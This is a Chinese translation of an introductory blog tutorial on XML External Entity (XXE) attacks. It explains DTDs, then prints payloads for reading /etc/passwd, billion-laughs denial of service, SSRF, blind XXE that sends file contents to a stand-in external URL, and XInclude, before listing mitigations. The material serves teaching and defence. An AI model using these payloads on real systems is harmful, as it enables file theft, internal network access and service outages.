# XXE:网络应用安全基础知识

> 原文：<https://infosecwriteups.com/xxe-web-app-security-basics-70ef8ed274f0?source=collection_archive---------3----------------------->

![](img/0d44d57e2ed3fb2cbbabf2adaa4551e9.png)

XXE 又名 **XML 外部实体**是针对允许 XML 输入的应用程序的攻击，攻击者可以干扰应用程序的 XML 处理。如果攻击成功，攻击者可以查看服务器上的文件数据，并进行路径遍历、端口扫描、拒绝服务等多种攻击，甚至访问应用程序有权访问的内部机器(指 SSRF 攻击)。在 [OWASP Top 10 (2017)](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html) 中排名第四。

**这种脆弱性是如何产生的？**

当应用程序的弱配置 XML 解析器处理 DTD(文档类型声明)时，即内部或外部，应用程序中很可能存在此漏洞。外部 DTD 更有趣，因为它们允许实体的值是文件路径或 URL。

外部 DTD 示例:

```
POST /home/ HTTP/1.1
Host: www.idontknow.com<?xml version=”1.0" encoding=”UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
<foo>
 &xxe;
</foo>
```

让我们深入了解一些基本信息:

**什么是 XML？**

XML(可扩展标记语言)是一种标记语言，它定义了一组以人类可读和机器可读的格式编码文档的规则。它是像 HTML 一样的标记语言。这是非常自我描述的。

**什么是 DTD？**

DTD 代表文档类型定义。DTD 的目的是定义 XML 文档的结构、合法元素和属性。DTD 从 here are two types of DTD declaration:

*   **内部 DTD 声明**开始:当元素在 XML 中声明时。

```
<!DOCTYPE test 
[ <!ENTITY xxe "Vulnerability"> 
]>
```

*   **外部 DTD 声明**:当元素在 XML 之外声明时。通过指定系统属性来访问它们，这些属性可以是合法的*。dtd* 文件或有效的 URL。

```
<!DOCTYPE test 
[ <!ENTITY xxe SYSTEM “any_dtd_file.dtd”>
]>
```

**注意**:XML 规范不允许将外部实体与内部实体结合使用。

**现在进攻部分**:

当应用程序的请求如下所示时:

```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
  <!ELEMENT Test ANY>
  <!ENTITY xxe "Possible">
]>
<foo>
  &xxe**;**
</foo>
```

得到的回答是:

```
HTTP/1.0 200 OK

Possible
```

我们可以在这里尝试不同的技术和有效载荷。

*   **文件泄露**:获取'/etc/passwd '文件的内容。

```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
  <!ELEMENT Test ANY>
  <!ENTITY xxe SYSTEM “file:///etc/passwd”> 
]>
<foo>
  &xxe**;**
</foo>
```

*   **拒绝服务**:泛指亿笑攻击。这个简单的有效载荷可以占用高达 3gb 的内存。

```
POST http://somesite.com/xml HTTP/1.1<?xml version="1.0" ?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<foo>
  &lol9;
</foo>
```

*   **SSRF(服务器端请求伪造)**:攻击者可以从服务器向其他资源发送请求，以获取敏感信息。

```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data[
  <!ELEMENT Test ANY>
  <!ENTITY xxe SYSTEM “https://www.othersite.com/text.txt”>
]>
<foo>
  &xxe**;**
</foo>
```

*   **盲 XXE** :当应用程序易受 XXE 攻击，但在其响应中不返回任何定义的外部实体的值时。

```
POST http://somesite.com/xml HTTP/1.1<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT Test ANY>
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">
]>
<foo>
  &blind;
</foo>
```

*   **XInclude** :当应用程序从请求中获取数据并将其嵌入到服务器端的 XML 文档中时，XInclude 攻击技术就会被利用。

```
POST http://somesite.com/xml HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**缓解**:

*   禁止使用 dtd。如果不可能，可以考虑 [OWASP XXE 预防小抄](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)。
*   禁用对 XInclude 的支持。

**参考**:

[](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/) [## 什么是 XML 外部实体(XXE)攻击

### XML 外部实体(XXE)攻击(有时称为 XXE 注入攻击)是一种滥用广泛的…

www.acunetix.com](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/) [](https://portswigger.net/web-security/xxe) [## 什么是 XXE (XML 外部实体)注入？教程和示例|网络安全学院

### 在这一节中，我们将解释什么是 XML 外部实体注入，描述一些常见的例子，解释如何…

portswigger.net](https://portswigger.net/web-security/xxe)  [## XML 外部实体防护- OWASP 备忘单系列

### XML 外部实体注入(XXE)是一种攻击，现在通过 A4 点成为 OWASP 十大攻击之一

cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)